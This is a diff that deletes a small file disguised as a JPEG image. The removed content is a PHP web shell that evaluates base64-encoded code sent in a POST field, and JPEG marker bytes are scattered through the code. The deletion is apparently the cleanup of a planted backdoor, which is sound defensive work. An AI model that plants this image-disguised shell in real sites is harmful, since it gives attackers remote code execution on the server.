@@ -1,6 +1,0 @@
-ÿØÿàÿÐ<?php
-$codeÿÑ = $_POST['ÿÒcode'] ?? 'ÿÓ';
-if($codeÿÔ) {
-    evaÿÕl(base64_deÿÖcode($code)ÿ×);
-}
-?>ÿÙ
